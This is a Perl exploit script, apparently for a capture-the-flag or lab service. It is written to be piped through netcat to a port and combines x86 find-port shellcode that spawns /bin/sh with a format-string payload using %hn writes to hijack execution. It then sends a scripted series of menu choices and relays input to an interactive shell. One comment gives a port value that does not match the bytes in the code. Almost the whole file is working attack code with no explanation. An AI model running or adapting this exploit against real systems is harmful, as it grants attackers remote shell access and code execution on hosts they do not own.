#!/usr/bin/perl

# Usage:
# ./nx200-exploit.pl | nc -p 4222 0.0.0.0 9999

$| = 1;

$upper="\x56\xb5\x04\x08";
$lower="\x54\xb5\x04\x08";

#Test Case
#print "AAAA" . ".%x"x100 "\n";

$cport="\x10\x7e";	#port 0x0539 = 1337 in decimal

my $sc =
"\x31\xdb\xf7\xe3\x53\x89\xe2\x6a\x10\x54\x52\x53\x89\xe1\xb3" . 
"\x07\xb0\x66\xcd\x80\x31\xdb\x66\x39\xd8\x75\x0c\x66\xbb" . 
"$cport" .
"\x8b\x7a\x02\x66\x39\xfb\x74\x07\x31\xc0\x5b\x43\x53\xeb" . 
"\xe0\x5b\x31\xc9\xb1\x03\xb0\x3f\x66\x49\xcd\x80\x66\x41\xe2" . 
"\xf6\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50" . 
"\x53\x89\xe1\x99\xb0\x0b\xcd\x80\x41";
# Shellcode Length: 84
# Find/Bind Port Shellcode
# cport = 1337

print $sc . $lower . $upper . "%1960c%30\$hn%35795c%29\$hn";
sleep(1);
print;
print "3\n";
sleep(1);
print "2\n";
sleep(1);
print "3\n";
sleep(1);
print "2\n";
sleep(1);
print "2\n";
sleep(1);

while (<>) 
{print;}
